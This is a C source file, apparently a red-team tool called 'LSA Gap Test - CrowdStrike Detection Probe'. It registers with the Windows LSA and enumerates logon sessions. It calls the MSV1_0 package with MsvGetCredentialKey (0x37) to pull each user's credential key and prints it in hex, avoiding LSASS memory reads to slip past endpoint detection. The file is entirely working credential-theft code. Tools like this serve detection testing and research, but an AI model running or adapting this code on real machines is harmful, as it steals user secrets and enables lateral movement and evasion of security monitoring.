#include <windows.h>
#include <stdio.h>

/* All types defined AFTER windows.h so UNICODE_STRING etc are available */

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((LONG)0x00000000L)
#endif

typedef LONG NTSTATUS;

typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} MY_LSA_STRING;

typedef struct {
    ULONG               Size;
    LUID                LogonId;
    UNICODE_STRING      UserName;
    UNICODE_STRING      LogonDomain;
    UNICODE_STRING      AuthenticationPackage;
    ULONG               LogonType;
    ULONG               Session;
    PSID                Sid;
    LARGE_INTEGER       LogonTime;
    UNICODE_STRING      LogonServer;
    UNICODE_STRING      DnsDomainName;
    UNICODE_STRING      Upn;
} MY_SESSION_DATA;

typedef struct {
    ULONG MessageType;
    LUID  LogonId;
} CREDKEY_REQUEST;

typedef struct {
    ULONG MessageType;
    ULONG KeyType;
    UCHAR Key[20];
} CREDKEY_RESPONSE;

/* Function pointer types */
typedef NTSTATUS (WINAPI *fn_Register)(MY_LSA_STRING*, PHANDLE, PULONG);
typedef NTSTATUS (WINAPI *fn_Lookup)(HANDLE, MY_LSA_STRING*, PULONG);
typedef NTSTATUS (WINAPI *fn_Call)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
typedef NTSTATUS (WINAPI *fn_Free)(PVOID);
typedef NTSTATUS (WINAPI *fn_Enumerate)(PULONG, PLUID*);
typedef NTSTATUS (WINAPI *fn_GetData)(PLUID, MY_SESSION_DATA**);
typedef NTSTATUS (WINAPI *fn_Deregister)(HANDLE);

static fn_Register   _Register   = NULL;
static fn_Lookup     _Lookup     = NULL;
static fn_Call       _Call       = NULL;
static fn_Free       _Free       = NULL;
static fn_Enumerate  _Enumerate  = NULL;
static fn_GetData    _GetData    = NULL;
static fn_Deregister _Deregister = NULL;

static int LoadFunctions(void) {
    HMODULE h = LoadLibraryA("secur32.dll");
    if (!h) { printf("[-] Cannot load secur32.dll\n"); return 0; }
    _Register   = (fn_Register)  GetProcAddress(h, "LsaRegisterLogonProcess");
    _Lookup     = (fn_Lookup)    GetProcAddress(h, "LsaLookupAuthenticationPackage");
    _Call       = (fn_Call)      GetProcAddress(h, "LsaCallAuthenticationPackage");
    _Free       = (fn_Free)      GetProcAddress(h, "LsaFreeReturnBuffer");
    _Enumerate  = (fn_Enumerate) GetProcAddress(h, "LsaEnumerateLogonSessions");
    _GetData    = (fn_GetData)   GetProcAddress(h, "LsaGetLogonSessionData");
    _Deregister = (fn_Deregister)GetProcAddress(h, "LsaDeregisterLogonProcess");
    if (!_Register||!_Lookup||!_Call||!_Free||!_Enumerate||!_GetData||!_Deregister) {
        printf("[-] Failed to resolve functions\n"); return 0;
    }
    printf("[+] secur32.dll loaded OK\n");
    return 1;
}

static void InitStr(MY_LSA_STRING *s, char *b) {
    s->Buffer = b;
    s->Length = (USHORT)strlen(b);
    s->MaximumLength = s->Length + 1;
}

static void PrintHex(const char *label, UCHAR *data, ULONG len) {
    printf("    [+] %s: ", label);
    for (ULONG i = 0; i < len; i++) printf("%02X", data[i]);
    printf("\n");
}

static int RunTest(LUID luid) {
    HANDLE     h       = NULL;
    ULONG      pkg     = 0;
    NTSTATUS   st      = 0;
    NTSTATUS   sub     = 0;
    MY_LSA_STRING proc, name;
    CREDKEY_REQUEST  req;
    CREDKEY_RESPONSE *resp = NULL;
    ULONG respLen = 0;

    /* STEP 1 - Register as LSA client (fires Event ID 4611) */
    InitStr(&proc, "svcgaptest");
    printf("\n[*] STEP 1: LsaRegisterLogonProcess\n");
    st = _Register(&proc, &h, NULL);
    if (st != STATUS_SUCCESS) {
        printf("[-] FAILED 0x%08X - run as Administrator\n", (unsigned)st);
        return 1;
    }
    printf("    [+] OK  handle=%p\n", h);

    /* STEP 2 - Resolve MSV1_0 package ID */
    InitStr(&name, "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0");
    printf("[*] STEP 2: LsaLookupAuthenticationPackage\n");
    st = _Lookup(h, &name, &pkg);
    if (st != STATUS_SUCCESS) {
        printf("[-] FAILED 0x%08X\n", (unsigned)st);
        _Deregister(h); return 1;
    }
    printf("    [+] OK  package_id=%lu\n", pkg);

    /* STEP 3 - MsvGetCredentialKey (0x37) — same call as LSAWhisper-BOF */
    memset(&req, 0, sizeof(req));
    req.MessageType = 0x37;
    req.LogonId = luid;

    printf("[*] STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey=0x37)\n");
    printf("    LUID: 0x%08X:0x%08X\n", (unsigned)luid.HighPart, (unsigned)luid.LowPart);

    st = _Call(h, pkg, &req, sizeof(req), (PVOID*)&resp, &respLen, &sub);

    if (st != STATUS_SUCCESS)
        printf("[-] Outer FAILED: 0x%08X\n", (unsigned)st);
    else if (sub != STATUS_SUCCESS)
        printf("[-] Inner FAILED: 0x%08X (bad LUID?)\n", (unsigned)sub);
    else {
        printf("    [+] OK  %lu bytes\n", respLen);
        if (resp && respLen >= sizeof(CREDKEY_RESPONSE)) {
            printf("\n    === CREDENTIAL KEY EXTRACTED ===\n");
            PrintHex("Key", resp->Key, 20);
            printf("    KeyType: %lu (1=Local 2=Domain)\n", resp->KeyType);
            printf("    ================================\n");
        }
        if (resp) _Free(resp);
    }

    _Deregister(h);
    return (st == STATUS_SUCCESS && sub == STATUS_SUCCESS) ? 0 : 2;
}

static void RunAll(void) {
    ULONG count = 0;
    PLUID sessions = NULL;
    printf("[*] Enumerating sessions...\n");
    if (_Enumerate(&count, &sessions) != STATUS_SUCCESS) {
        printf("[-] Enumerate failed\n"); return;
    }
    printf("[*] %lu sessions found\n", count);
    for (ULONG i = 0; i < count; i++) {
        MY_SESSION_DATA *d = NULL;
        if (_GetData(&sessions[i], &d) == STATUS_SUCCESS && d) {
            if (d->LogonType == 2 || d->LogonType == 3 || d->LogonType == 5) {
                printf("\n--- Session %lu  LUID=0x%X  Type=%lu ---\n",
                    i+1, (unsigned)sessions[i].LowPart, d->LogonType);
                if (d->UserName.Buffer)
                    printf("    User: %S\\%S\n", d->LogonDomain.Buffer, d->UserName.Buffer);
                RunTest(sessions[i]);
            }
            _Free(d);
        }
    }
    _Free(sessions);
}

int main(int argc, char *argv[]) {
    printf("================================================\n");
    printf("  LSA Gap Test - CrowdStrike Detection Probe\n");
    printf("  No LSASS handle. No memory read. No DLL.\n");
    printf("================================================\n");

    if (!LoadFunctions()) return 1;

    if (argc == 2) {
        LUID luid = {0};
        unsigned long long raw = strtoull(argv[1], NULL, 0);
        luid.LowPart  = (ULONG)(raw & 0xFFFFFFFF);
        luid.HighPart = (LONG)((raw >> 32) & 0xFFFFFFFF);
        return RunTest(luid);
    }
    RunAll();
    return 0;
}
